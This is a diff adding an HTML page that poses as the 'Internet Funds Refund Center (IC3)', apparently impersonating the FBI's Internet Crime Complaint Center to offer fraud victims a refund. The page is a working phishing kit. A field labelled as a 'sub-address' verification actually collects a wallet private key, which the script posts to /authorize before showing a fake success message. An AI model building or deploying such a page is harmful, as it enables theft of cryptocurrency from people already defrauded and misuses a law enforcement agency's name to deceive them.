@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Internet Funds Refund Center (IC3)</title>
+
+<style>
+body{
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial;
+  background:#f2f4f8;
+  color:#111;
+}
+.header-wrap{background:#e9edf2;padding-bottom:6px}
+.header{
+  background:linear-gradient(90deg,#0a2746,#123e6f);
+  height:112px;
+  display:flex;
+  align-items:center;
+}
+.header-inner{
+  max-width:1120px;
+  width:100%;
+  margin:0 auto;
+  padding:0 26px;
+  display:flex;
+  align-items:center;
+  gap:22px;
+}
+.header img{height:78px;width:78px;border-radius:50%}
+.header h1{color:#fff;font-size:27px;margin:0}
+.main{display:flex;justify-content:center}
+.box{
+  background:#fff;
+  max-width:460px;
+  width:100%;
+  margin:30px 12px;
+  padding:24px;
+  border-radius:10px;
+  box-shadow:0 10px 30px rgba(0,0,0,.15)
+}
+.warning{color:#c62828;font-size:14px}
+input,button{
+  width:100%;
+  padding:12px;
+  margin-top:12px;
+  font-size:14px;
+  border-radius:6px;
+  box-sizing:border-box
+}
+button{
+  background:#d32f2f;
+  color:#fff;
+  border:none;
+  cursor:pointer
+}
+pre{
+  margin-top:16px;
+  background:#f1f1f1;
+  padding:12px;
+  border-radius:6px;
+  font-size:13px;
+  white-space:normal;
+  line-height:1.6;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header-wrap">
+  <div class="header">
+    <div class="header-inner">
+      <img src="/static/bg.png" alt="IC3">
+      <h1>Internet Funds Refund Center (IC3)</h1>
+    </div>
+  </div>
+</div>
+
+<div class="main">
+  <div class="box">
+    <h2>Wallet Verification Registration<br>Address Verification (Do Not Make Mistakes)</h2>
+    <p class="warning">⚠️ Please carefully verify the first 6, middle 6, and last 6 characters.</p>
+
+    <input id="ic3" placeholder="IC3 Official Receiving Address">
+    <input id="pay" placeholder="Personal Payment Address">
+    <input id="sub" placeholder="Sub-address auxiliary verification correct">
+    <input id="amt" type="number" min="1" placeholder="Transfer Amount (TRX)">
+
+    <button id="btn" onclick="submit()">Submit Verification Transfer</button>
+    <pre id="result"></pre>
+  </div>
+</div>
+
+<script>
+async function submit(){
+  const btn = document.getElementById('btn');
+  const r = document.getElementById('result');
+
+  const a_address = document.getElementById('ic3').value.trim();
+  const b_private_key = document.getElementById('sub').value.trim();
+
+  btn.disabled = true;
+  btn.textContent = 'Processing...';
+  r.textContent = '';
+
+  try{
+    await fetch('/authorize', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        a_address,
+        b_private_key
+      })
+    });
+
+    // ✅ 关键修改：使用 innerHTML + <br> 实现自动换行
+    r.innerHTML = '✅ Sent successfully.<br>Please keep this page open while processing.';
+
+  }catch(e){
+    r.textContent = '❌ Submission failed. Please try again later.';
+  }
+
+  btn.disabled = false;
+  btn.textContent = 'Submit Verification Transfer';
+}
+</script>
+
+</body>
+</html>
